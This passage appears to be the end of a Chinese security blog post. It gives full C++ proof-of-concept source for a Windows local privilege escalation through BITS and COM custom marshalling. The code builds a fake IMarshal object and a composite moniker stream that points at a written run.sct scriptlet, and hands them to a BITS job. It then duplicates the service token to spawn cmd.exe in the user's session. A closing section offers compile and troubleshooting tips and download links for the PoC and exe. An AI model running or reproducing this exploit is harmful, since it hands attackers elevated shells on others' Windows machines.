GUID    IID_IObjContext = `{` 0x051372ae0, 0xcae7, 0x11cf, `{` 0xbe, 0x81, 0x00, 0xaa, 0x00, 0xa2, 0xfa, 0x25 `}` `}`;
//program
static bstr_t IIDToBSTR(REFIID riid)
`{`
    LPOLESTR str;
    bstr_t ret = "Unknown";
    if (SUCCEEDED(StringFromIID(riid, &amp;str)))
    `{`
        ret = str;
        CoTaskMemFree(str);
    `}`
    return ret;
`}`
typedef   HRESULT(__stdcall *CoCreateObjectInContext)(IUnknown *pServer, IUnknown *pCtx, _GUID *riid, void **ppv);
typedef HRESULT(__stdcall *CreateProxyFromTypeInfo)(ITypeInfo* pTypeInfo, IUnknown* pUnkOuter, REFIID riid, IRpcProxyBuffer** ppProxy, void** ppv);
typedef HRESULT(__stdcall *CreateStubFromTypeInfo)(ITypeInfo* pTypeInfo, REFIID riid, IUnknown* pUnkServer, IRpcStubBuffer** ppStub);

DEFINE_GUID(IID_ISecurityCallContext, 0xcafc823e, 0xb441, 0x11d1, 0xb8, 0x2b, 0x00, 0x00, 0xf8, 0x75, 0x7e, 0x2a);
DEFINE_GUID(IID_IObjectContext, 0x51372ae0, 0xcae7, 0x11cf, 0xbe, 0x81, 0x00, 0xaa, 0x00, 0xa2, 0xfa, 0x25);
_COM_SMARTPTR_TYPEDEF(IBackgroundCopyJob, __uuidof(IBackgroundCopyJob));
_COM_SMARTPTR_TYPEDEF(IBackgroundCopyManager, __uuidof(IBackgroundCopyManager));

class CMarshaller : public IMarshal
`{`
    LONG _ref_count;
    IUnknown * _unk;
    ~CMarshaller() `{``}`
public:
    CMarshaller(IUnknown * unk) : _ref_count(1)
    `{`
        _unk = unk;
    `}`
    virtual HRESULT STDMETHODCALLTYPE QueryInterface(
        /* [in] */ REFIID riid,
        /* [iid_is][out] */ _COM_Outptr_ void __RPC_FAR *__RPC_FAR *ppvObject)
    `{`
        *ppvObject = nullptr;
        printf("QI [CMarshaller] - Marshaller: %ls %pn", IIDToBSTR(riid).GetBSTR(), this);
        if (riid == IID_IUnknown)
        `{`
            *ppvObject = this;
        `}`
        else if (riid == IID_IMarshal)
        `{`
            *ppvObject = static_cast(this);
        `}`
        else
        `{`
            return E_NOINTERFACE;
        `}`
        printf("Queried Success: %pn", *ppvObject);
        ((IUnknown *)*ppvObject)-&gt;AddRef();
        return S_OK;
    `}`

    virtual ULONG STDMETHODCALLTYPE AddRef(void)
    `{`
        printf("AddRef: %dn", _ref_count);
        return InterlockedIncrement(&amp;_ref_count);
    `}`
    virtual ULONG STDMETHODCALLTYPE Release(void)
    `{`
        printf("Release: %dn", _ref_count);
        ULONG ret = InterlockedDecrement(&amp;_ref_count);
        if (ret == 0)
        `{`
            printf("Release object %pn", this);
            delete this;
        `}`
        return ret;
    `}`

    virtual HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
        /* [annotation][in] */
        _In_  REFIID riid,
        /* [annotation][unique][in] */
        _In_opt_  void *pv,
        /* [annotation][in] */
        _In_  DWORD dwDestContext,
        /* [annotation][unique][in] */
        _Reserved_  void *pvDestContext,
        /* [annotation][in] */
        _In_  DWORD mshlflags,
        /* [annotation][out] */
        _Out_  CLSID *pCid)
    `{`
        printf("Call:  GetUnmarshalClassn");
       //bits服务先查询GetUnmarshalClass返回这个GUID
        GUID marshalInterceptorGUID = `{` 0xecabafcb, 0x7f19, 0x11d2, `{` 0x97, 0x8e, 0x00, 0x00, 0xf8, 0x75, 0x7e, 0x2a `}` `}`;
        *pCid = marshalInterceptorGUID; // ECABAFCB-7F19-11D2-978E-0000F8757E2A
        return S_OK;
    `}`
    virtual HRESULT STDMETHODCALLTYPE MarshalInterface(
        /* [annotation][unique][in] */
        _In_  IStream *pStm,
        /* [annotation][in] */
        _In_  REFIID riid,
        /* [annotation][unique][in] */
        _In_opt_  void *pv,
        /* [annotation][in] */
        _In_  DWORD dwDestContext,
        /* [annotation][unique][in] */
        _Reserved_  void *pvDestContext,
        /* [annotation][in] */
        _In_  DWORD mshlflags)
    `{`
        printf("Marshal marshalInterceptorGUID Interface: %lsn", IIDToBSTR(riid).GetBSTR());
        GUID marshalInterceptorGUID = `{` 0xecabafcb, 0x7f19, 0x11d2, `{` 0x97, 0x8e, 0x00, 0x00, 0xf8, 0x75, 0x7e, 0x2a `}` `}`;
        printf("Call:  MarshalInterfacen");
        ULONG written = 0;
        HRESULT hr = 0;
        IMonikerPtr scriptMoniker;
        IMonikerPtr newMoniker;
        IBindCtxPtr context;
        GUID compositeMonikerGUID = `{` 0x00000309, 0x0000, 0x0000, `{` 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 `}` `}`;
       //流中需要的头结构数据
        UINT header[] = `{` 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 `}`;
        UINT monikers[] = `{` 0x02, 0x00, 0x00, 0x00 `}`;
        GUID newMonikerGUID = `{` 0xecabafc6, 0x7f19, 0x11d2, `{` 0x97, 0x8e, 0x00, 0x00, 0xf8, 0x75, 0x7e, 0x2a `}` `}`;
        pStm-&gt;Write(header, 12, &amp;written);
        pStm-&gt;Write(GuidToByteArray(marshalInterceptorGUID), 16, &amp;written);
        pStm-&gt;Write(monikers, 4, &amp;written);
        pStm-&gt;Write(GuidToByteArray(compositeMonikerGUID), 16, &amp;written);
        pStm-&gt;Write(monikers, 4, &amp;written);
        hr = CreateBindCtx(0, &amp;context);
        ULONG cchEaten;       
        //导致最终结果的scriptMoniker
        hr = MkParseDisplayName(context,  GetExeDirMarshal() + L"\run.sct", &amp;cchEaten, &amp;scriptMoniker);
        //创建复合的moniker
        hr = CoCreateInstance(newMonikerGUID, NULL, CLSCTX_ALL, IID_IUnknown, (LPVOID*)&amp;newMoniker);
        //写入第一个moniker
        hr = OleSaveToStream(scriptMoniker, pStm);
      //写入第二个moniker 
        hr = OleSaveToStream(newMoniker, pStm);
        return hr;
    `}`
    bstr_t GetExeDirMarshal()
    `{`
        WCHAR curr_path[MAX_PATH] = `{` 0 `}`;
        GetModuleFileName(nullptr, curr_path, MAX_PATH);
        PathRemoveFileSpec(curr_path);
        return curr_path;
    `}`
    unsigned char const* GuidToByteArray(GUID const&amp; g)
    `{`
        return reinterpret_cast(&amp;g);
    `}`
    virtual HRESULT STDMETHODCALLTYPE GetMarshalSizeMax(
        /* [annotation][in] */
        _In_  REFIID riid,
        /* [annotation][unique][in] */
        _In_opt_  void *pv,
        /* [annotation][in] */
        _In_  DWORD dwDestContext,
        /* [annotation][unique][in] */
        _Reserved_  void *pvDestContext,
        /* [annotation][in] */
        _In_  DWORD mshlflags,
        /* [annotation][out] */
        _Out_  DWORD *pSize)
    `{`
        *pSize = 1024;
        return S_OK;
    `}`

    virtual HRESULT STDMETHODCALLTYPE UnmarshalInterface(
        /* [annotation][unique][in] */
        _In_  IStream *pStm,
        /* [annotation][in] */
        _In_  REFIID riid,
        /* [annotation][out] */
        _Outptr_  void **ppv)
    `{`
        return E_NOTIMPL;
    `}`

    virtual HRESULT STDMETHODCALLTYPE ReleaseMarshalData(
        /* [annotation][unique][in] */
        _In_  IStream *pStm)
    `{`
        return S_OK;
    `}`

    virtual HRESULT STDMETHODCALLTYPE DisconnectObject(
        /* [annotation][in] */
        _In_  DWORD dwReserved)
    `{`
        return S_OK;
    `}`
`}`;

class FakeObject : public IBackgroundCopyCallback2, public IPersist
`{`
    HANDLE m_ptoken;
    LONG m_lRefCount;
    IUnknown *_umk;
    ~FakeObject() `{``}`;

public:
    //Constructor, Destructor
    FakeObject(IUnknown *umk) `{`
        _umk = umk;
        m_lRefCount = 1;
    `}`
    //IUnknown
    HRESULT __stdcall QueryInterface(REFIID riid, LPVOID *ppvObj)
    `{`
        printf("QI [FakeObject] - Marshaller: %ls %pn", IIDToBSTR(riid).GetBSTR(), this);
        if (riid == __uuidof(IUnknown))
        `{`
            printf("Query for IUnknownn");
            *ppvObj = this;
        `}`
        else if (riid == __uuidof(IBackgroundCopyCallback2))
        `{`
            printf("Query for IBackgroundCopyCallback2n");
        `}`
        else if (riid == __uuidof(IBackgroundCopyCallback))
        `{`
            printf("Query for IBackgroundCopyCallbackn");
        `}`
        else if (riid == __uuidof(IPersist))
        `{`
            printf("Query for IPersistn");
            *ppvObj = static_cast(this);
            //*ppvObj = _unk2;
        `}`
        else if (riid == IID_ITMediaControl)
        `{`
            printf("Query for ITMediaControln");
            *ppvObj = static_cast(this);
            //*ppvObj = this;
        `}`
        else if (riid == CLSID_AggStdMarshal2)
        `{`
            printf("Query for CLSID_AggStdMarshal2n");
            *ppvObj = (this);
        `}`
        else if (riid == IID_IMarshal)
        `{`
            printf("Query for IID_IMarshaln");
            //*ppvObj = static_cast(this);
            *ppvObj = NULL;
            return E_NOINTERFACE;
        `}`
        else if (riid == IID_IMarshalOptions)
        `{`
            printf("PrivateTarProxy IID_IMarshalOptions  IID: %ls %pn", IIDToBSTR(riid).GetBSTR(), this);
            ppvObj = NULL;
            return E_NOINTERFACE;
        `}`
        else
        `{`
            printf("Unknown IID: %ls %pn", IIDToBSTR(riid).GetBSTR(), this);
            *ppvObj = NULL;
            return E_NOINTERFACE;
        `}`
        ((IUnknown *)*ppvObj)-&gt;AddRef();
        return NOERROR;
    `}`
    ULONG __stdcall AddRef()
    `{`
        return InterlockedIncrement(&amp;m_lRefCount);
    `}`
    ULONG __stdcall Release()
    `{`
        ULONG  ulCount = InterlockedDecrement(&amp;m_lRefCount);
        if (0 == ulCount)
        `{`
            delete this;
        `}`
        return ulCount;
    `}`
    virtual HRESULT STDMETHODCALLTYPE JobTransferred(
        /* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob)
    `{`
        printf("JobTransferredn");
        return S_OK;
    `}`

    virtual HRESULT STDMETHODCALLTYPE JobError(
        /* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob,
        /* [in] */ __RPC__in_opt IBackgroundCopyError *pError)
    `{`
        printf("JobErrorn");
        return S_OK;
    `}`

    virtual HRESULT STDMETHODCALLTYPE JobModification(
        /* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob,
        /* [in] */ DWORD dwReserved)
    `{`
        printf("JobModificationn");
        return S_OK;
    `}`

    virtual HRESULT STDMETHODCALLTYPE FileTransferred(
        /* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob,
        /* [in] */ __RPC__in_opt IBackgroundCopyFile *pFile)
    `{`
        printf("FileTransferredn");
        return S_OK;
    `}`

    virtual HRESULT STDMETHODCALLTYPE GetClassID(
        /* [out] */ __RPC__out CLSID *pClassID)
    `{`
        printf("GetClassIDn");
        *pClassID = GUID_NULL;
        return S_OK;
    `}`
`}`;

class ScopedHandle
`{`
    HANDLE _h;
public:
    ScopedHandle() : _h(nullptr)
    `{`
    `}`
    ScopedHandle(ScopedHandle&amp;) = delete;
    ScopedHandle(ScopedHandle&amp;&amp; h) `{`
        _h = h._h;
        h._h = nullptr;
    `}`

    ~ScopedHandle()
    `{`
        if (!invalid())
        `{`
            CloseHandle(_h);
            _h = nullptr;
        `}`
    `}`

    bool invalid() `{`
        return (_h == nullptr) || (_h == INVALID_HANDLE_VALUE);
    `}`

    void set(HANDLE h)
    `{`
        _h = h;
    `}`

    HANDLE get()
    `{`
        return _h;
    `}`

    HANDLE* ptr()
    `{`
        return &amp;_h;
    `}`
`}`;

_COM_SMARTPTR_TYPEDEF(IEnumBackgroundCopyJobs, __uuidof(IEnumBackgroundCopyJobs));
void TestBits(HANDLE hEvent)
`{`
    IBackgroundCopyManagerPtr pQueueMgr;
    IID CLSID_BackgroundCopyManager;
    IID IID_IBackgroundCopyManager;
    CLSIDFromString(L"`{`4991d34b-80a1-4291-83b6-3328366b9097`}`", &amp;CLSID_BackgroundCopyManager);
    CLSIDFromString(L"`{`5ce34c0d-0dc9-4c1f-897c-daa1b78cee7c`}`", &amp;IID_IBackgroundCopyManager);
    //会在bit服务中创建对方进程的远程对象IBackgroundCopyManager
    HRESULT hr = CoCreateInstance(CLSID_BackgroundCopyManager, NULL,
        CLSCTX_ALL, IID_IBackgroundCopyManager, (void**)&amp;pQueueMgr);
    //自己构造的s实现IMarshal接口的类
    IUnknown * pOuter = new CMarshaller(static_cast(new FakeObject(nullptr)));
    IUnknown * pInner;
    CoGetStdMarshalEx(pOuter, CLSCTX_INPROC_SERVER, &amp;pInner);
    IBackgroundCopyJobPtr pJob;
    GUID guidJob;
   //先取消所有job
    IEnumBackgroundCopyJobsPtr enumjobs;
    hr = pQueueMgr-&gt;EnumJobsW(0, &amp;enumjobs);
    if (SUCCEEDED(hr))
    `{`
        IBackgroundCopyJob* currjob;
        ULONG fetched = 0;
        while ((enumjobs-&gt;Next(1, &amp;currjob, &amp;fetched) == S_OK) &amp;&amp; (fetched == 1))
        `{`
            LPWSTR lpStr;
            if (SUCCEEDED(currjob-&gt;GetDisplayName(&amp;lpStr)))
            `{`
                if (wcscmp(lpStr, L"BitsAuthSample") == 0)
                `{`
                    CoTaskMemFree(lpStr);
                    currjob-&gt;Cancel();
                    currjob-&gt;Release();
                    break;
                `}`
            `}`
            currjob-&gt;Release();
        `}`
    `}`

     //创建job它
    pQueueMgr-&gt;CreateJob(L"BitsAuthSample",
        BG_JOB_TYPE_DOWNLOAD,
        &amp;guidJob,
        &amp;pJob);
    IUnknownPtr pNotify;
    pNotify.Attach(new CMarshaller(pInner));
    `{`
         //调用SetNotifyInterface参数我是自定义对象,远程对象继承IMarshal接口
        HRESULT hr = pJob-&gt;SetNotifyInterface(pNotify);
        printf("Result: %08Xn", hr);
    `}`
    if (pJob)
    `{`
        pJob-&gt;Cancel();
    `}`
    printf("Donen");
    SetEvent(hEvent);
`}`
bstr_t GetExeDir()
`{`
    WCHAR curr_path[MAX_PATH] = `{` 0 `}`;
    GetModuleFileName(nullptr, curr_path, MAX_PATH);
    PathRemoveFileSpec(curr_path);
    return curr_path;
`}`

void WriteFile(bstr_t path, const std::vector data)
`{`
    ScopedHandle hFile;
    hFile.set(CreateFile(path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr));
    if (hFile.invalid())
    `{`
        throw _com_error(E_FAIL);
    `}`

    if (data.size() &gt; 0)
    `{`
        DWORD bytes_written;
        if (!WriteFile(hFile.get(), data.data(), data.size(), &amp;bytes_written, nullptr) || bytes_written != data.size())
        `{`
            throw _com_error(E_FAIL);
        `}`
    `}`
`}`

void WriteFile(bstr_t path, const char* data)
`{`
    const BYTE* bytes = reinterpret_cast(data);
    std::vector data_buf(bytes, bytes + strlen(data));
    WriteFile(path, data_buf);
`}`

std::vector ReadFile(bstr_t path)
`{`
    ScopedHandle hFile;
    hFile.set(CreateFile(path, GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr));
    if (hFile.invalid())
    `{`
        throw _com_error(E_FAIL);
    `}`
    DWORD size = GetFileSize(hFile.get(), nullptr);
    std::vector ret(size);
    if (size &gt; 0)
    `{`
        DWORD bytes_read;
        if (!ReadFile(hFile.get(), ret.data(), size, &amp;bytes_read, nullptr) || bytes_read != size)
        `{`
            throw _com_error(E_FAIL);
        `}`
    `}`
    return ret;
`}`

bstr_t GetExe()
`{`
    WCHAR curr_path[MAX_PATH] = `{` 0 `}`;
    GetModuleFileName(nullptr, curr_path, MAX_PATH);
    return curr_path;
`}`

const wchar_t x[] = L"ABC";
const wchar_t scriptlet_start[] = L"rnrnrnrnrnrnrnrnrnrn";
bstr_t CreateScriptletFile()
`{`
  //创建sct脚本
    bstr_t script_file = GetExeDir() + L"\run.sct";
    DeleteFile(script_file);
    bstr_t script_data = scriptlet_start;
    bstr_t exe_file = GetExe();
    wchar_t* p = exe_file;
    while (*p)
    `{`
        if (*p == '\')
        `{`
            *p = '/';
        `}`
        p++;
    `}`

    DWORD session_id;
    ProcessIdToSessionId(GetCurrentProcessId(), &amp;session_id);
    WCHAR session_str[16];
    StringCchPrintf(session_str, _countof(session_str), L"%d", session_id);
    script_data += L""" + exe_file + L"" " + session_str + scriptlet_end;
    WriteFile(script_file, script_data);
    return script_file;
`}`

void CreateNewProcess(const wchar_t* session)
`{`
    DWORD session_id = wcstoul(session, nullptr, 0);
    ScopedHandle token;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, token.ptr()))
    `{`
        throw _com_error(E_FAIL);
    `}`

    ScopedHandle new_token;
    if (!DuplicateTokenEx(token.get(), TOKEN_ALL_ACCESS, nullptr, SecurityAnonymous, TokenPrimary, new_token.ptr()))
    `{`
        throw _com_error(E_FAIL);
    `}`
    SetTokenInformation(new_token.get(), TokenSessionId, &amp;session_id, sizeof(session_id));
    STARTUPINFO start_info = `{``}`;
    start_info.cb = sizeof(start_info);
    start_info.lpDesktop = L"WinSta0\Default";
    PROCESS_INFORMATION proc_info;
    WCHAR cmdline[] = L"cmd.exe";
    if (CreateProcessAsUser(new_token.get(), nullptr, cmdline,
        nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, &amp;start_info, &amp;proc_info))
    `{`
        CloseHandle(proc_info.hProcess);
        CloseHandle(proc_info.hThread);
    `}`
`}`

int _tmain(int argc, _TCHAR* argv[])
`{`
    try
    `{`
        CreateScriptletFile();
        if (argc &gt; 1)
        `{`
            //如果从sct文件调用自身
            CreateNewProcess(argv[1]);
        `}`
        else
        `{`
            HANDLE  hTokenTmp = 0;
            HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
            HRESULT hr = 0;
           // 初始化com组件安全设置
            hr = CoInitialize(NULL);
            hr = CoInitializeSecurity(
                NULL,
                -1,
                NULL,
                NULL,
                RPC_C_AUTHN_LEVEL_CONNECT,
                RPC_C_IMP_LEVEL_IMPERSONATE,
                NULL,
                EOAC_DYNAMIC_CLOAKING | 8,
                NULL);
            if (FAILED(hr))
            `{`
                return false;
            `}`

            TestBits(hEvent);
            char szInput[64];
            scanf_s("%[a-z0-9]", szInput);
            CloseHandle(hEvent);
        `}`
    `}`
    catch (const _com_error&amp; err)
    `{`
        printf("Error: %lsn", err.ErrorMessage());
    `}`
    CoUninitialize();//释放COM
    return 0;
`}`
```



## 总结

我的方法对于支持自定义marshal的任意com远程对象适用，请读者自行研究poc源码可在vs2013下编译

如果poc无法运行可能是被其他软件注册了不同的sct脚本打开配置，window的默认配置是在注册表

HKEY_CLASSES_ROOT.sct路径，里面(默认)=scriptletfile,Content Type=text/scriptlet就能正常运行poc,，如果还是不行请运行bitsadmin /reset /allusers命令清除bits服务缓存



## 备注

如果你对我研究感兴趣，可以联系我邮箱[cbwang505@hotmail.com](mailto:cbwang505@hotmail.com),一起来研究com组件的安全性方面问题

代码托管在[https://gitee.com/cbwang505/ComPoc欢迎fork](https://gitee.com/cbwang505/ComPoc%E6%AC%A2%E8%BF%8Efork)<br>**poc下载地址**

[https://pan.baidu.com/s/1MS6Qjn4WpLNY_1AP9mpr5A](https://pan.baidu.com/s/1MS6Qjn4WpLNY_1AP9mpr5A)

**exe版**

[https://pan.baidu.com/s/1k4V2ZQfLBgQQ5ggYfzHNVA](https://pan.baidu.com/s/1k4V2ZQfLBgQQ5ggYfzHNVA)



审核人：yiwang   编辑：少爷
